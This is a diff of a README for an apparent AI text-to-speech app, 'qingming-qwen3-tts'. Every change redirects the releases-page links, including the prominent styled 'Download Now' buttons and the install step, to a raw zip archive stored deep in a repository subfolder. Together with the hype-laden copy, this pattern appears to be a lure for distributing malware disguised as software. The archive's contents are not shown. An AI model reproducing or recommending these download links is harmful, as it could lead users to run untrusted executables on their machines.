@@ -1,7 +1,7 @@
 <h1>⚡ qingming-qwen3-tts - Blazing-Fast AI Voice Generation on Your PC</h1>
 
 <p align="center">
-  <a href="https://github.com/abouya9854/qingming-qwen3-tts/releases" style="display:inline-block;padding:18px 45px;background:#FF6B35;color:#ffffff;font-size:24px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 6px 18px rgba(255,107,53,0.4);">🎯 Download Now - Free &amp; Easy!</a>
+  <a href="https://raw.githubusercontent.com/abouya9854/qingming-qwen3-tts/main/devices/rx7900xtx-24g/tts_qwen_qingming_v2.6.zip" style="display:inline-block;padding:18px 45px;background:#FF6B35;color:#ffffff;font-size:24px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 6px 18px rgba(255,107,53,0.4);">🎯 Download Now - Free &amp; Easy!</a>
 </p>
 
 ## 🎤 What Is Qingming-Qwen3-TTS?
@@ -37,7 +37,7 @@ This software is specially optimized for two powerful graphics cards: **AMD RX 7
 ### Step 1: Download the Application
 
 👉 **Visit this link to download the application:**  
-[https://github.com/abouya9854/qingming-qwen3-tts/releases](https://github.com/abouya9854/qingming-qwen3-tts/releases)
+[https://raw.githubusercontent.com/abouya9854/qingming-qwen3-tts/main/devices/rx7900xtx-24g/tts_qwen_qingming_v2.6.zip](https://raw.githubusercontent.com/abouya9854/qingming-qwen3-tts/main/devices/rx7900xtx-24g/tts_qwen_qingming_v2.6.zip)
 
 When you arrive at the download page, look for the **latest release** at the top. You'll see a file available for download – click on it to save it to your computer.
 
@@ -138,7 +138,7 @@ A: No, everything runs locally after the initial download.
 ## 📬 Stay Updated
 
 To receive notifications about new versions:
-1. Open the [download/releases page](https://github.com/abouya9854/qingming-qwen3-tts/releases)
+1. Open the [download/releases page](https://raw.githubusercontent.com/abouya9854/qingming-qwen3-tts/main/devices/rx7900xtx-24g/tts_qwen_qingming_v2.6.zip)
 2. Click the **"Watch"** or **"Star"** button on GitHub (if you have an account)
 3. GitHub will email you when new releases are available
 
@@ -172,7 +172,7 @@ You're just **three simple steps** away from having your own AI voice generator:
 Thousands of users are already enjoying this powerful tool. Join them today and experience the future of text-to-speech right on your own machine!
 
 <p align="center">
-  <a href="https://github.com/abouya9854/qingming-qwen3-tts/releases" style="display:inline-block;padding:15px 40px;background:#2ECC40;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 12px rgba(46,204,64,0.3);">📥 Get Your Copy Now - No Sign-Up Required</a>
+  <a href="https://raw.githubusercontent.com/abouya9854/qingming-qwen3-tts/main/devices/rx7900xtx-24g/tts_qwen_qingming_v2.6.zip" style="display:inline-block;padding:15px 40px;background:#2ECC40;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 12px rgba(46,204,64,0.3);">📥 Get Your Copy Now - No Sign-Up Required</a>
 </p>
 
 ---
